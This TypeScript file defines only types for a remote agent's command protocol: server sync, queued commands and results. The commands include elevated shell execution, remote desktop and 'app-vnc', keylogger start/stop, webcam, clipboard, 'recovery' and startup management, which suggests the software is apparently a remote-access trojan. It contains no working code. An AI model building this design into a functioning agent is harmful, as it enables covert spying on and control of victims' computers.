import type { AgentConfig } from "./config";
import type { AgentMetrics, AgentStatus } from "./agent";
import type { PluginSyncPayload, PluginManifestDelta } from "./plugin-manifest";
import type {
  RemoteDesktopCommandPayload,
  RemoteDesktopInputBurst,
} from "./remote-desktop";
import type { AppVncCommandPayload, AppVncInputBurst } from "./app-vnc";
import type { AudioControlCommandPayload } from "./audio";
import type { ClipboardCommandPayload } from "./clipboard";
import type { RecoveryCommandPayload } from "./recovery";
import type { FileManagerCommandPayload } from "./file-manager";
import type { TcpConnectionsCommandPayload } from "./tcp-connections";
import type { ClientChatCommandPayload } from "./client-chat";
import type { ToolActivationCommandPayload } from "./tool-activation";
import type { WebcamCommandPayload } from "./webcam";
import type { TaskManagerCommandPayload } from "./task-manager";
import type { StartupCommandPayload } from "./startup-manager";
import type { KeyloggerCommandPayload } from "./keylogger";
import type { SystemInfoCommandPayload, SystemInfoSnapshot } from "./system-info";

export type CommandName =
  | "ping"
  | "shell"
  | "remote-desktop"
  | "app-vnc"
  | "system-info"
  | "open-url"
  | "audio-control"
  | "agent-control"
  | "clipboard"
  | "recovery"
  | "file-manager"
  | "tcp-connections"
  | "client-chat"
  | "tool-activation"
  | "webcam-control"
  | "task-manager"
  | "keylogger.start"
  | "keylogger.stop"
  | "startup-manager";

export interface PingCommandPayload {
  message?: string;
}

export interface ShellCommandPayload {
  command: string;
  timeoutSeconds?: number;
  workingDirectory?: string;
  elevated?: boolean;
  environment?: Record<string, string>;
}

export interface OpenUrlCommandPayload {
  url: string;
  note?: string;
}

export type AgentControlAction =
  | "disconnect"
  | "reconnect"
  | "shutdown"
  | "restart"
  | "sleep"
  | "logoff";

export interface AgentControlCommandPayload {
  action: AgentControlAction;
  reason?: string;
  force?: boolean;
}

export type CommandPayload =
  | PingCommandPayload
  | ShellCommandPayload
  | RemoteDesktopCommandPayload
  | AppVncCommandPayload
  | SystemInfoCommandPayload
  | OpenUrlCommandPayload
  | AudioControlCommandPayload
  | AgentControlCommandPayload
  | ClipboardCommandPayload
  | RecoveryCommandPayload
  | FileManagerCommandPayload
  | TcpConnectionsCommandPayload
  | ClientChatCommandPayload
  | ToolActivationCommandPayload
  | WebcamCommandPayload
  | TaskManagerCommandPayload
  | KeyloggerCommandPayload
  | StartupCommandPayload;

export interface CommandInput {
  name: CommandName;
  payload: CommandPayload;
}

export interface Command extends CommandInput {
  id: string;
  createdAt: string;
}

export interface CommandResult {
  commandId: string;
  success: boolean;
  output?: string;
  error?: string;
  completedAt: string;
}

export interface AgentSyncRequest {
  status: AgentStatus;
  timestamp: string;
  metrics?: AgentMetrics;
  results?: CommandResult[];
  plugins?: PluginSyncPayload;
}

export interface AgentSyncResponse {
  agentId: string;
  commands: Command[];
  config: AgentConfig;
  serverTime: string;
  pluginManifests?: PluginManifestDelta;
}

export type CommandDeliveryMode = "session" | "queued";

export interface CommandQueueResponse {
  command: Command;
  delivery: CommandDeliveryMode;
}

export interface CommandQueueSnapshot {
  commands: Command[];
}

export interface AgentCommandEnvelope {
  type: "command";
  command: Command;
}

export interface AgentRemoteDesktopInputEnvelope {
  type: "remote-desktop-input";
  input: RemoteDesktopInputBurst;
}

export interface AgentAppVncInputEnvelope {
  type: "app-vnc-input";
  input: AppVncInputBurst;
}

export interface AgentSystemInfoEnvelope {
  type: "system-info";
  snapshot: SystemInfoSnapshot;
}

export type AgentEnvelope =
  | AgentCommandEnvelope
  | AgentRemoteDesktopInputEnvelope
  | AgentAppVncInputEnvelope
  | AgentSystemInfoEnvelope;
